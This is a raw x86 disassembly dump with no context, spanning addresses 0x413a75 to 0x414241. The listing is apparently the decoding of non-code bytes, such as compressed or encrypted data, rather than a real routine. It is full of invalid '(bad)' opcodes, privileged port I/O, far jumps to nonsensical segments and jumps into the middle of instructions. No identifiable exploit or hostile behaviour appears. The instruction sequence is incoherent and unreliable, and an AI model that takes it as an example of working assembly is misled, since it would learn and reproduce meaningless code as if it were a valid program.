  413a75:	dec    ebx
  413a76:	pop    esp
  413a77:	test   BYTE PTR [eax],ah
  413a79:	pop    es
  413a7a:	mov    ebx,0x90f4f0e6
  413a7f:	aas    
  413a80:	push   esi
  413a81:	sub    edx,DWORD PTR [eax]
  413a83:	fdiv   st,st(7)
  413a85:	(bad)  
  413a86:	lahf   
  413a87:	jge    0x413aeb
  413a89:	mov    ah,0xcc
  413a8b:	out    0x33,eax
  413a8d:	lock lds edx,FWORD PTR [edi-0x13]
  413a91:	(bad)  
  413a93:	or     eax,DWORD PTR [edx]
  413a95:	jp     0x413ae3
  413a97:	inc    dx
  413a99:	push   cs
  413a9a:	add    DWORD PTR [edi],esp
  413a9c:	jae    0x413af2
  413a9e:	pop    edx
  413a9f:	jbe    0x413aa2
  413aa1:	fsub   QWORD PTR [edi]
  413aa3:	shl    BYTE PTR [edi+0x1a9c6600],1
  413aa9:	sti    
  413aaa:	cmp    al,0xb1
  413aac:	test   DWORD PTR [ecx-0x2],edi
  413aaf:	xchg   ebp,eax
  413ab0:	ins    DWORD PTR es:[edi],dx
  413ab1:	fwait
  413ab2:	xchg   edi,eax
  413ab3:	sar    DWORD PTR [ecx],cl
  413ab5:	test   BYTE PTR [eax+0xe74d40b],0x99
  413abc:	jns    0x413ad8
  413abe:	imul   ecx,DWORD PTR [esi],0x88f1bde4
  413ac4:	pop    ss
  413ac5:	push   ds
  413ac6:	jle    0x413a69
  413ac8:	out    0xd7,eax
  413aca:	pusha  
  413acb:	or     cl,BYTE PTR [esi+0x2]
  413ace:	sbb    cl,BYTE PTR [edi+0x4af1fe2a]
  413ad4:	xchg   esi,eax
  413ad5:	sbb    eax,0x8c5548f8
  413ada:	ja     0x413a84
  413adc:	(bad)  
  413add:	outs   dx,DWORD PTR ds:[esi]
  413ade:	ret    
  413adf:	mov    WORD PTR [esp+ebp*1+0x1e],cs
  413ae3:	pop    ebx
  413ae5:	pop    ds
  413ae6:	xor    BYTE PTR [edi-0x3d],dh
  413ae9:	xlat   BYTE PTR ds:[ebx]
  413aea:	out    dx,eax
  413aeb:	aam    0x3d
  413aed:	push   ecx
  413aee:	in     al,0x14
  413af0:	dec    ecx
  413af1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413af2:	or     dh,BYTE PTR ds:0xdd0e1d42
  413af8:	pop    edx
  413af9:	cdq    
  413afa:	cmc    
  413afb:	in     eax,dx
  413afc:	jg     0x413ad5
  413afe:	sbb    BYTE PTR [ebx+0x27],0xd3
  413b02:	push   ds
  413b03:	sub    eax,0x2e73a0c7
  413b08:	aad    0xe8
  413b0a:	jmp    0x845f0c0b
  413b0f:	add    DWORD PTR [ebx-0x24],ebx
  413b12:	in     al,0x65
  413b14:	sti    
  413b15:	pop    ss
  413b16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b17:	add    al,0x26
  413b19:	xchg   edx,eax
  413b1a:	dec    esi
  413b1b:	push   es
  413b1c:	fwait
  413b1d:	xchg   edi,eax
  413b1e:	mov    bh,0x42
  413b20:	mov    dh,0xad
  413b22:	adc    DWORD PTR [ebx-0x4bf85063],eax
  413b28:	bnd call 0x85402e74
  413b2e:	xor    ebx,DWORD PTR [ebx+edx*8-0xd03fcbc]
  413b35:	enter  0x6c2,0x3
  413b39:	jle    0x413b8b
  413b3b:	bound  esi,QWORD PTR [ebx-0x2197b14c]
  413b41:	pop    eax
  413b42:	lea    ebx,[edi+0x71]
  413b45:	mov    edi,0xd2d2f70b
  413b4a:	pop    cx
  413b4c:	gs mov dl,0x6c
  413b4f:	aam    0xd6
  413b51:	inc    esi
  413b52:	shr    bh,1
  413b54:	jne    0x413b33
  413b56:	fwait
  413b57:	test   BYTE PTR [ebp-0x8],ah
  413b5a:	mov    al,0xee
  413b5c:	cmp    eax,0x506e7384
  413b61:	sti    
  413b62:	sar    ebp,cl
  413b64:	out    dx,al
  413b65:	scas   al,BYTE PTR es:[edi]
  413b66:	sbb    DWORD PTR [esi-0x2a],edi
  413b69:	jbe    0x413b53
  413b6b:	mov    dl,0xb0
  413b6d:	cmovno esp,DWORD PTR [eax+0x3a8bcf8e]
  413b74:	xlat   BYTE PTR ds:[ebx]
  413b75:	test   BYTE PTR [eax+0x3ae666ce],al
  413b7b:	push   es
  413b7c:	imul   bh
  413b7e:	aaa    
  413b7f:	cmp    BYTE PTR [esi+0x1df3f894],0x74
  413b86:	shr    edi,0x58
  413b89:	add    DWORD PTR [ecx+0x1e],edx
  413b8c:	xor    WORD PTR [ebx],bx
  413b8f:	mov    ch,0xcc
  413b91:	xor    DWORD PTR [edi-0x19e3c9b5],ecx
  413b97:	pop    ebx
  413b98:	js     0x413b5b
  413b9a:	js     0x413b97
  413b9c:	cmp    al,BYTE PTR [esi+edi*8]
  413b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ba0:	in     al,dx
  413ba1:	popa   
  413ba2:	jg     0x413b24
  413ba4:	mov    ?,WORD PTR [esi-0x1cc86af5]
  413baa:	xchg   edi,eax
  413bab:	pop    ecx
  413bac:	adc    edi,DWORD PTR ds:0x55fb791f
  413bb2:	adc    BYTE PTR [esi-0x7e],dh
  413bb5:	clc    
  413bb6:	stos   DWORD PTR es:[edi],eax
  413bb7:	pop    es
  413bb8:	in     al,dx
  413bb9:	xchg   ebp,eax
  413bba:	sub    DWORD PTR [edx+esi*2],esi
  413bbd:	jbe    0x413b42
  413bbf:	lock in eax,dx
  413bc1:	adc    BYTE PTR [esp+0x4c],0xa
  413bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bc7:	sbb    ebx,DWORD PTR [esp+edi*8+0x7a]
  413bcb:	cli    
  413bcc:	stos   DWORD PTR es:[edi],eax
  413bcd:	or     BYTE PTR [ecx-0x366a44ff],dl
  413bd3:	sub    eax,0xcc24a93c
  413bd8:	add    eax,0xb5e7d244
  413bdd:	or     DWORD PTR [ebx-0x6f247236],ebp
  413be3:	cmp    al,0x4b
  413be5:	inc    edi
  413be6:	inc    edi
  413be7:	addr16 retf 
  413be9:	cmp    eax,0x288d9569
  413bee:	les    esp,FWORD PTR [edi+0x46ee26b9]
  413bf4:	repz sbb ebx,0x7f8621f8
  413bfb:	out    0x69,al
  413bfd:	(bad)  
  413bfe:	lea    eax,[ebp*1-0x111b0782]
  413c05:	and    eax,DWORD PTR [bp+si]
  413c08:	xchg   bh,dh
  413c0a:	retf   0x3c87
  413c0d:	mov    esi,0x535e7d25
  413c12:	imul   BYTE PTR [ecx+0x67ea8615]
  413c18:	dec    ebx
  413c19:	pop    eax
  413c1a:	cmc    
  413c1b:	(bad)  
  413c1c:	rcl    DWORD PTR ds:0x6296219d,cl
  413c22:	rcl    BYTE PTR [esi],0xdb
  413c25:	js     0x413bfb
  413c27:	fwait
  413c28:	mov    dh,0xbb
  413c2a:	inc    edi
  413c2b:	cmp    al,BYTE PTR [ebp+ebx*4+0x2c0265e]
  413c32:	dec    esp
  413c33:	test   al,0x4e
  413c35:	inc    esi
  413c36:	cmp    al,0x7e
  413c39:	or     al,0x6c
  413c3b:	mov    ds:0xc3cbcde5,al
  413c40:	adc    ah,cl
  413c42:	ror    DWORD PTR [ebp+0x6],1
  413c45:	scas   al,BYTE PTR es:[edi]
  413c46:	inc    esp
  413c47:	xlat   BYTE PTR ds:[ebx]
  413c48:	shl    DWORD PTR [eax+esi*8+0x14],1
  413c4c:	mov    BYTE PTR [edx-0x34],cl
  413c4f:	adc    BYTE PTR [eax-0x36766102],cl
  413c55:	ds adc eax,0xd586b21a
  413c5b:	jno    0x413bf1
  413c5d:	pop    esp
  413c5e:	jmp    DWORD PTR [ecx-0x2e862b23]
  413c64:	push   ebp
  413c65:	mov    edx,0x39d7efda
  413c6a:	in     eax,0x50
  413c6c:	or     edx,DWORD PTR ss:[eax+0xe8d32bf]
  413c73:	push   edi
  413c74:	and    DWORD PTR [ecx],eax
  413c76:	(bad)  
  413c77:	ror    DWORD PTR [eax],cl
  413c79:	int3   
  413c7a:	shl    edx,0xd3
  413c7d:	icebp  
  413c7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c7f:	outs   dx,DWORD PTR ds:[esi]
  413c80:	mov    cl,0xc5
  413c82:	push   ecx
  413c83:	clc    
  413c84:	dec    esi
  413c85:	jp     0x413cf7
  413c87:	ins    DWORD PTR es:[edi],dx
  413c88:	outs   dx,BYTE PTR ds:[esi]
  413c89:	adc    BYTE PTR [edx-0x7f14d27c],bh
  413c8f:	imul   esi,ecx,0x26eb823
  413c95:	xor    BYTE PTR [ebp-0x2bf58962],ch
  413c9b:	stc    
  413c9c:	xor    DWORD PTR [eax+0xc],eax
  413c9f:	test   BYTE PTR [ecx-0x84145e8],bh
  413ca5:	pop    ebp
  413ca6:	and    eax,0xb3d98ff4
  413cab:	iret   
  413cac:	xor    ebx,DWORD PTR [eax]
  413cae:	dec    ebp
  413caf:	xor    eax,0xb5033bd6
  413cb4:	test   eax,0xa4b6029c
  413cb9:	inc    ebp
  413cba:	mov    edi,0x34b800b6
  413cbf:	out    dx,eax
  413cc0:	ss hlt 
  413cc2:	shl    BYTE PTR [edi+0x1cdfe258],1
  413cc8:	js     0x413d06
  413cca:	dec    ecx
  413ccb:	mov    ah,0xb8
  413ccd:	sbb    esi,esi
  413ccf:	xchg   DWORD PTR [ebx],edi
  413cd1:	jbe    0x413ca2
  413cd3:	icebp  
  413cd4:	jbe    0x413cb0
  413cd6:	lods   eax,DWORD PTR ds:[esi]
  413cd7:	or     ax,dx
  413cda:	test   eax,0x699b4d84
  413cdf:	xchg   esp,eax
  413ce0:	into   
  413ce1:	das    
  413ce2:	dec    ebx
  413ce3:	fdivr  DWORD PTR [edi+0x2d698956]
  413ce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cea:	mov    DWORD PTR [eax-0x6b],ecx
  413ced:	and    al,0x42
  413cef:	add    al,dl
  413cf1:	pop    ebx
  413cf2:	xchg   edx,eax
  413cf3:	dec    esp
  413cf4:	mov    ecx,0x8649ebd9
  413cf9:	jge    0x413d44
  413cfb:	push   esi
  413cfc:	mov    ebp,ss
  413cfe:	inc    ecx
  413cff:	mov    ch,0x8c
  413d01:	fistp  WORD PTR [ebp-0x2b]
  413d04:	arpl   di,bx
  413d06:	xor    DWORD PTR [esp+ebp*4],0x60
  413d0a:	fimul  WORD PTR [edi+0x72df0fff]
  413d10:	cld    
  413d11:	pop    es
  413d12:	retf   
  413d13:	sub    DWORD PTR [esi],0xffffffb7
  413d16:	call   0x6fbd26e
  413d1b:	jae    0x413d68
  413d1d:	outs   dx,DWORD PTR ds:[esi]
  413d1e:	arpl   WORD PTR [ebp+0xe253307],dx
  413d24:	loop   0x413d09
  413d26:	int3   
  413d27:	mov    eax,0x53b45eb9
  413d2c:	push   ebp
  413d2d:	loope  0x413d27
  413d2f:	aam    0xb5
  413d31:	jg     0x413d93
  413d33:	or     eax,0x497afe03
  413d38:	cmp    eax,0xb1445ec6
  413d3d:	pop    edx
  413d3e:	mov    bh,BYTE PTR [edx]
  413d40:	rcr    BYTE PTR [ebx],cl
  413d42:	mov    WORD PTR [eax],?
  413d44:	ss in  al,dx
  413d46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d47:	fstp   QWORD PTR [ebx]
  413d49:	fwait
  413d4a:	daa    
  413d4b:	cld    
  413d4c:	mov    al,ds:0x4a32f72f
  413d51:	xchg   DWORD PTR [edi+ebx*8-0x1d],edi
  413d55:	mov    ds:0xf0f55bdd,eax
  413d5a:	jb     0x413d3f
  413d5c:	xchg   esi,eax
  413d5d:	fisub  DWORD PTR [ebx-0x40]
  413d60:	retf   0xae2
  413d63:	cmp    ebp,DWORD PTR [edx]
  413d65:	ins    BYTE PTR es:[edi],dx
  413d66:	push   cs
  413d67:	loope  0x413d81
  413d69:	mov    ch,bl
  413d6b:	inc    ebp
  413d6c:	rol    DWORD PTR [esp+edx*8-0x39],cl
  413d70:	pop    ss
  413d71:	jl     0x413d5f
  413d73:	sahf   
  413d74:	dec    esi
  413d75:	fild   WORD PTR [ecx+ebp*8+0x42]
  413d79:	push   esp
  413d7a:	call   0x1efc:0x23384c34
  413d81:	xlat   BYTE PTR ds:[ebx]
  413d82:	add    ecx,esi
  413d84:	iret   
  413d85:	in     eax,dx
  413d86:	lock dec eax
  413d88:	mov    bh,0x47
  413d8a:	and    al,BYTE PTR [ecx-0x2c77d2bb]
  413d90:	rcl    DWORD PTR [edx+0x1c49a404],1
  413d96:	push   DWORD PTR [esi-0x2c]
  413d99:	xor    DWORD PTR [edi+ebp*2+0x5f],esp
  413d9d:	fwait
  413d9e:	sbb    bl,BYTE PTR [ebp+0x783cd519]
  413da4:	xlat   BYTE PTR ds:[ebx]
  413da5:	repz call 0xfd0badde
  413dab:	ins    DWORD PTR es:[edi],dx
  413dac:	mov    bl,0xc4
  413dae:	inc    ebx
  413daf:	sbb    al,0xeb
  413db1:	jge    0x413d59
  413db3:	lds    edi,FWORD PTR [eax-0xe]
  413db6:	(bad)  
  413db7:	xchg   DWORD PTR [esp+edx*2-0x1e],esi
  413dbb:	fs jbe 0x413d40
  413dbe:	aad    0xff
  413dc0:	div    BYTE PTR [edx+ebp*1+0x2c]
  413dc4:	dec    eax
  413dc5:	out    0x5b,al
  413dc7:	mov    edi,0x78b946ff
  413dcc:	pushf  
  413dcd:	push   esi
  413dce:	pop    edi
  413dcf:	dec    edx
  413dd0:	jmp    0x76de:0x7da3bbda
  413dd7:	not    dh
  413dd9:	pop    edx
  413dda:	popa   
  413ddb:	mov    ds:0x7c69ffd5,eax
  413de0:	clc    
  413de1:	imul   esi,DWORD PTR [ebx],0x34
  413de4:	mov    edx,0x391ca472
  413de9:	xchg   ecx,eax
  413dea:	mov    ecx,DWORD PTR [ecx+edx*4+0xd]
  413dee:	xor    ebx,ecx
  413df0:	push   es
  413df1:	jne    0x413d97
  413df3:	and    DWORD PTR [edx+eiz*8],eax
  413df6:	lods   al,BYTE PTR ds:[esi]
  413df7:	leave  
  413df8:	and    al,0xd3
  413dfa:	out    dx,eax
  413dfb:	sbb    eax,0xba48ab74
  413e00:	dec    esp
  413e01:	or     eax,0x2f29c8e1
  413e06:	xchg   DWORD PTR [ebx+0x5286bc8b],ecx
  413e0c:	ror    BYTE PTR [ebp+0x21],1
  413e0f:	push   edi
  413e10:	cmp    esi,0x6f
  413e13:	fwait
  413e14:	mov    dh,0x50
  413e16:	mov    esp,0x7978faba
  413e1b:	push   esi
  413e1c:	shl    DWORD PTR [ebx+ebp*1+0x42],0x2e
  413e21:	sub    eax,0xfa5e16d9
  413e26:	jo     0x413e34
  413e28:	imul   esi,edi,0xffffff81
  413e2b:	iret   
  413e2c:	mov    ah,0x91
  413e2e:	into   
  413e2f:	sbb    BYTE PTR [esi-0x21],dh
  413e32:	fwait
  413e33:	ss ds jmp 0xfad75041
  413e3a:	mov    dl,0xaf
  413e3c:	mov    al,ds:0xd27262db
  413e41:	scas   eax,DWORD PTR es:[edi]
  413e42:	sub    ebx,DWORD PTR [ebx-0xc04a173]
  413e48:	dec    esp
  413e49:	daa    
  413e4a:	sbb    eax,0x76e0d9d0
  413e4f:	jne    0x413e99
  413e51:	pop    ss
  413e52:	int    0xfd
  413e54:	and    BYTE PTR [edi+esi*1-0x6af2c471],al
  413e5b:	mov    eax,ebp
  413e5d:	dec    edx
  413e5e:	icebp  
  413e5f:	fs add cl,BYTE PTR es:[eax+0x15]
  413e64:	add    bh,BYTE PTR [edi+0xc77590c]
  413e6a:	mov    ecx,0xc3ed6f8b
  413e6f:	push   cs
  413e70:	and    DWORD PTR [eax],esi
  413e72:	jmp    0x34954745
  413e77:	out    0xb1,eax
  413e79:	jae    0x413ee0
  413e7b:	mov    bh,0x49
  413e7d:	ss mov edi,0xb1f6088
  413e83:	pop    edx
  413e84:	push   edi
  413e85:	test   DWORD PTR [ebx],esi
  413e87:	mov    ecx,0x4bf0f316
  413e8c:	rcl    BYTE PTR [edx-0x54],1
  413e8f:	loope  0x413e44
  413e91:	loope  0x413e24
  413e93:	(bad)  
  413e94:	lds    ecx,FWORD PTR [edx+0x39]
  413e97:	ret    
  413e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e99:	popf   
  413e9a:	and    eax,0x5f213d98
  413e9f:	push   ebp
  413ea0:	jb     0x413eb3
  413ea2:	add    ecx,DWORD PTR [edi+0x29c52ecd]
  413ea8:	fist   DWORD PTR [ecx-0x41d6eba0]
  413eae:	adc    edi,esi
  413eb0:	push   eax
  413eb1:	das    
  413eb2:	imul   edx,DWORD PTR [ebx-0x29],0xffffff8d
  413eb6:	sbb    BYTE PTR [edi],dl
  413eb8:	les    eax,FWORD PTR [esi-0x3a314c9b]
  413ebe:	popf   
  413ebf:	aaa    
  413ec0:	in     eax,dx
  413ec1:	in     al,dx
  413ec2:	repz fistp DWORD PTR [ecx+0x69]
  413ec6:	(bad)  
  413ec7:	adc    DWORD PTR [edx-0x304a6260],esp
  413ecd:	and    edi,DWORD PTR [edx]
  413ecf:	test   eax,0x328c4e16
  413ed4:	outs   dx,DWORD PTR ds:[esi]
  413ed5:	repz idiv ebp
  413ed8:	mov    ebx,0x8c85f276
  413edd:	mov    bl,0xbf
  413edf:	fs inc esp
  413ee1:	int    0x33
  413ee3:	push   edi
  413ee4:	daa    
  413ee5:	popf   
  413ee6:	(bad)  
  413ee7:	pop    ebx
  413ee8:	mov    ds:0xfbc07f44,eax
  413eed:	xor    al,0xe0
  413eef:	adc    BYTE PTR [edi-0x63b0fa8f],ah
  413ef5:	xlat   BYTE PTR ds:[ebx]
  413ef6:	jnp    0x413ece
  413ef8:	inc    esi
  413ef9:	push   ds
  413efa:	int3   
  413efb:	cmc    
  413efc:	mov    eax,0x8e532e67
  413f01:	repz mov eax,ds:0xc0c4c0e1
  413f07:	dec    edi
  413f08:	cmp    eax,0xd33dc63e
  413f0d:	pop    ecx
  413f0e:	or     BYTE PTR ss:[edi],bl
  413f11:	arpl   WORD PTR [ebx],si
  413f13:	mov    bl,0xf5
  413f15:	aas    
  413f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f17:	mov    edi,0x660956a6
  413f1c:	push   ebp
  413f1d:	cmp    bh,BYTE PTR [ecx]
  413f1f:	xchg   esi,eax
  413f20:	pop    ss
  413f21:	add    dh,0x6b
  413f24:	sti    
  413f25:	mov    bl,0x97
  413f27:	repnz (bad) 
  413f29:	rcr    BYTE PTR [edi],cl
  413f2b:	mov    dh,0xbd
  413f2d:	mov    ds:0x5b781408,al
  413f32:	inc    edx
  413f33:	test   DWORD PTR [edi+0x40e98ffe],edi
  413f39:	(bad)  
  413f3a:	es imul ecx,ebx,0xffffff82
  413f3e:	pop    edx
  413f3f:	xchg   ebx,eax
  413f40:	ins    DWORD PTR es:[edi],dx
  413f41:	nop
  413f42:	std    
  413f43:	dec    esp
  413f44:	pushf  
  413f45:	dec    esp
  413f46:	sbb    BYTE PTR [ebx+0xe9086b6],0xe8
  413f4d:	pop    ecx
  413f4e:	jns    0x413fa6
  413f50:	sub    ch,BYTE PTR [edi+0x7704d11c]
  413f56:	sub    eax,0x624505e7
  413f5b:	and    edi,DWORD PTR [edi-0x18]
  413f5e:	cmp    DWORD PTR [edi],esp
  413f60:	or     cl,BYTE PTR [edi]
  413f62:	cwde   
  413f63:	imul   ebp,DWORD PTR [ecx+edx*1],0x1278db7e
  413f6a:	ja     0x413f8f
  413f6c:	sahf   
  413f6d:	lds    esi,FWORD PTR [edi+0x2f]
  413f70:	jecxz  0x413f38
  413f72:	popf   
  413f73:	add    BYTE PTR [edx+0x3071f5b1],cl
  413f79:	retf   0x5af6
  413f7c:	inc    ebp
  413f7d:	imul   ebp,edx,0xfffffffe
  413f80:	add    al,0x5e
  413f82:	pop    ds
  413f83:	sub    eax,0xeb8686d1
  413f88:	mov    bl,0x59
  413f8a:	mov    eax,esp
  413f8c:	ret    0xde1b
  413f8f:	ret    0x1336
  413f92:	cdq    
  413f93:	mov    edx,0x3a174540
  413f98:	js     0x413fbe
  413f9a:	rcl    BYTE PTR [ecx-0x59],cl
  413f9d:	dec    ebx
  413f9e:	mov    ebx,0xbb1ea358
  413fa3:	ss cwde 
  413fa5:	cmp    al,bl
  413fa7:	mov    bl,0xe1
  413fa9:	add    BYTE PTR [ecx],0xff
  413fac:	jbe    0x413fd8
  413fae:	adc    esp,DWORD PTR [esi-0x43]
  413fb1:	mov    cl,0x10
  413fb3:	in     al,0x81
  413fb5:	jp     0x413f72
  413fb7:	aaa    
  413fb8:	jbe    0x413f82
  413fba:	xor    ebp,DWORD PTR [eax-0x2c061d9b]
  413fc0:	adc    al,0x12
  413fc2:	or     eax,0x656665cf
  413fc7:	ja     0x413fc3
  413fc9:	dec    ebp
  413fca:	sub    esp,DWORD PTR [esp+ebx*8]
  413fcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fce:	push   ebp
  413fcf:	jmp    0x413ff8
  413fd1:	xchg   BYTE PTR [edx+0x3e],cl
  413fd4:	ret    0x212a
  413fd7:	xor    ch,BYTE PTR [esp+ebx*2]
  413fda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fdb:	mov    ebp,0x547c810
  413fe0:	ja     0x413f73
  413fe2:	and    ecx,DWORD PTR [edx+0x57ed4689]
  413fe8:	int3   
  413fe9:	loop   0x413fcd
  413feb:	mov    ds:0x4caba5bc,eax
  413ff0:	fisttp WORD PTR [edi]
  413ff2:	add    cl,BYTE PTR [edx+0x654da7ce]
  413ff8:	in     eax,dx
  413ff9:	jecxz  0x413fdd
  413ffb:	inc    eax
  413ffc:	xchg   DWORD PTR [esp+esi*2],ecx
  413fff:	call   0x857789a2
  414004:	mov    cl,0x58
  414006:	ds dec esi
  414008:	mov    al,0x60
  41400a:	fwait
  41400b:	in     eax,0xca
  41400d:	ret    
  41400e:	adc    eax,0xd7dbd1da
  414013:	icebp  
  414014:	cld    
  414015:	out    dx,al
  414016:	jns    0x41402f
  414018:	add    ecx,DWORD PTR [edi-0x78]
  41401b:	mov    ch,dh
  41401d:	imul   ebx,esi,0xe28c789b
  414023:	push   cs
  414024:	gs jmp 0x1aa6:0xa475dd29
  41402c:	lods   eax,DWORD PTR ds:[esi]
  41402d:	add    ebp,esp
  41402f:	inc    ebp
  414030:	call   0x8410d7a7
  414035:	inc    esp
  414036:	add    BYTE PTR ds:0x13672639,dh
  41403c:	cmp    ebx,DWORD PTR [ebx]
  41403e:	mov    edx,0x35fff0d1
  414043:	test   DWORD PTR [eax-0x3a],edx
  414046:	scas   al,BYTE PTR es:[edi]
  414047:	rcr    BYTE PTR [ebp+0x6108cd18],0xcb
  41404e:	mov    bl,ch
  414050:	push   esi
  414051:	and    eax,0x53553dde
  414056:	add    eax,0x6bf12d7b
  41405b:	in     eax,0xcf
  41405d:	add    al,BYTE PTR [edx]
  41405f:	mov    ebp,0xa19b8d3e
  414064:	xchg   esi,eax
  414065:	and    eax,0x7e105fda
  41406a:	enter  0x7d6c,0x3e
  41406e:	mov    ah,dl
  414070:	jae    0x4140d3
  414072:	packsswb mm1,QWORD PTR [ebx]
  414075:	gs xchg eax,ebp
  414078:	in     al,0x11
  41407a:	in     al,0xa4
  41407c:	jp     0x4140ea
  41407e:	xor    DWORD PTR [edx+0x3],ebp
  414081:	and    BYTE PTR [eax-0x71],dl
  414084:	inc    ebp
  414085:	sub    eax,0x7c53e368
  41408a:	into   
  41408b:	push   ecx
  41408c:	sub    esp,DWORD PTR [ebx]
  41408e:	mov    ebx,0x75bc0d88
  414093:	adc    al,BYTE PTR [ecx+0x5b]
  414096:	out    dx,eax
  414097:	shr    bl,1
  414099:	xor    BYTE PTR [edx+0x4c98f917],bl
  41409f:	jg     0x4140df
  4140a1:	mov    ds:0xa8258f7c,al
  4140a6:	inc    esp
  4140a7:	dec    edi
  4140a8:	jb     0x414089
  4140aa:	xchg   edx,eax
  4140ab:	cld    
  4140ac:	cmp    bh,BYTE PTR [edx-0x4a]
  4140af:	adc    eax,0xf6b8d0d9
  4140b4:	pop    ebp
  4140b5:	(bad)  [esi-0x2669a323]
  4140bb:	dec    esi
  4140bc:	or     eax,0xe606e512
  4140c1:	mov    bl,al
  4140c3:	dec    ebx
  4140c4:	out    dx,al
  4140c5:	bnd jmp 0x2205833
  4140cb:	sbb    al,0x7a
  4140cd:	ror    edx,0xd1
  4140d0:	scas   al,BYTE PTR es:[edi]
  4140d1:	scas   al,BYTE PTR es:[edi]
  4140d2:	mov    ds:0x3ed3d0a6,al
  4140d7:	push   ebp
  4140d8:	adc    DWORD PTR [esp+esi*8+0xd],edi
  4140dc:	cmp    eax,DWORD PTR [ecx-0x106b180a]
  4140e2:	jge    0x41406e
  4140e4:	in     eax,dx
  4140e5:	(bad)  
  4140e6:	gs ret 0xe5e2
  4140ea:	popa   
  4140eb:	add    esi,DWORD PTR [edx+0x506074e]
  4140f1:	inc    esi
  4140f2:	push   edx
  4140f3:	iret   
  4140f4:	cmc    
  4140f5:	add    eax,DWORD PTR [ebx+0x568e765e]
  4140fb:	inc    ebx
  4140fc:	cmp    al,0x13
  4140fe:	je     0x4140dd
  414100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414101:	dec    esi
  414102:	loopne 0x414174
  414104:	mov    al,ds:0xad84ea7a
  414109:	mov    dl,0xd0
  41410b:	jno    0x4140bc
  41410d:	inc    esi
  41410e:	hlt    
  41410f:	test   BYTE PTR ds:0xec1b2530,dh
  414115:	add    ebx,DWORD PTR [ebx+0x23eb6d08]
  41411b:	dec    edx
  41411c:	xchg   ecx,eax
  41411d:	shl    BYTE PTR [ecx-0x55],0xf4
  414121:	rcr    WORD PTR [ecx+eax*4-0x78],0x77
  414127:	repnz mov cl,0x22
  41412a:	fld    DWORD PTR [edi]
  41412c:	mov    esp,DWORD PTR ds:0xa840570b
  414132:	divps  xmm2,XMMWORD PTR [eax+0x62]
  414136:	mov    dh,0xfd
  414138:	jg     0x4141a8
  41413a:	or     eax,0x8bf796c2
  41413f:	iret   
  414140:	lock dec esi
  414142:	mov    bl,0xc
  414144:	adc    eax,0x5d5652fa
  414149:	or     edi,ecx
  41414b:	dec    esp
  41414c:	retf   
  41414d:	into   
  41414e:	iret   
  41414f:	out    0xf5,al
  414151:	push   edi
  414152:	sbb    ebx,edx
  414154:	call   0xbe43:0xdd903174
  41415b:	mov    ch,0x12
  41415d:	scas   eax,DWORD PTR es:[edi]
  41415e:	sub    esi,DWORD PTR [ecx+0x33]
  414161:	inc    ebp
  414162:	lods   eax,DWORD PTR ds:[esi]
  414163:	retf   
  414164:	xor    ebx,esi
  414166:	jmp    FWORD PTR [ebp+0x4505448c]
  41416c:	(bad)  
  41416e:	ror    DWORD PTR [edx+0x9b00642],1
  414174:	xor    DWORD PTR [ecx],0x3b
  414177:	mov    eax,0xdb994744
  41417c:	mov    ds:0x3be153a6,al
  414181:	mov    DWORD PTR [ebx],ecx
  414183:	mov    edx,0x3b868525
  414188:	or     eax,0xe8142bae
  41418d:	ret    0x25ae
  414190:	xor    ecx,ebp
  414192:	mov    dh,0xb2
  414194:	lahf   
  414195:	inc    eax
  414196:	cdq    
  414197:	hlt    
  414198:	or     eax,ebp
  41419a:	std    
  41419b:	inc    edi
  41419c:	inc    edi
  41419d:	jmp    0x9a547d20
  4141a2:	xor    eax,0x20b161e1
  4141a7:	popf   
  4141a8:	adc    esi,DWORD PTR [ecx-0x69]
  4141ab:	test   al,0x10
  4141ad:	pop    ebp
  4141ae:	mov    eax,ds:0xc8d61cc8
  4141b3:	mov    ds:0x2bd93c11,eax
  4141b8:	pop    esi
  4141b9:	bts    DWORD PTR [edi+0x24272719],edx
  4141c0:	mov    bh,0x42
  4141c2:	clc    
  4141c3:	push   0x8814b5f6
  4141c8:	inc    ebx
  4141c9:	sub    eax,0x6cb1556e
  4141ce:	sub    dl,BYTE PTR [edx-0x79]
  4141d1:	mov    ebx,0xd7093795
  4141d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141d7:	jecxz  0x4141fe
  4141d9:	dec    esi
  4141da:	sbb    eax,DWORD PTR [eax+0x2e]
  4141dd:	repz sub DWORD PTR [ecx+eiz*8-0x6c],esp
  4141e2:	ficom  DWORD PTR [edi*1+0x4a0740e5]
  4141e9:	xchg   esp,eax
  4141ea:	xchg   esp,eax
  4141eb:	bound  esp,QWORD PTR [ebp+0x40]
  4141ee:	push   ds
  4141ef:	sub    al,0xb7
  4141f1:	mov    ch,0xb9
  4141f3:	call   0x4e77:0x7ab5a752
  4141fa:	aad    0x2d
  4141fc:	int    0x96
  4141fe:	imul   DWORD PTR [esi+0x5b3843ba]
  414204:	in     al,0xea
  414206:	pop    eax
  414207:	popf   
  414208:	fistp  QWORD PTR ds:0x7dd5f4df
  41420e:	add    ebx,0x4c058309
  414214:	sub    eax,0x69060fe
  414219:	push   es
  41421a:	mov    ?,eax
  41421c:	sub    al,0x7b
  41421e:	pusha  
  41421f:	test   BYTE PTR [edx-0x21],0x92
  414223:	test   bh,cl
  414225:	mov    edx,0x1865f203
  41422a:	nop
  41422b:	into   
  41422c:	add    eax,0xf1bbb8a1
  414231:	and    BYTE PTR [eax+0x39],cl
  414234:	xlat   BYTE PTR ds:[ebx]
  414235:	nop
  414236:	xchg   edi,eax
  414237:	xchg   edi,eax
  414238:	scas   al,BYTE PTR es:[edi]
  414239:	xor    eax,DWORD PTR [ecx]
  41423b:	xchg   edx,eax
  41423c:	(bad)  
  41423d:	xchg   ebx,eax
  41423e:	clc    
  41423f:	push   esi
  414240:	push   edx
  414241:	sbb    esi,DWORD PTR [esi+ecx*1]
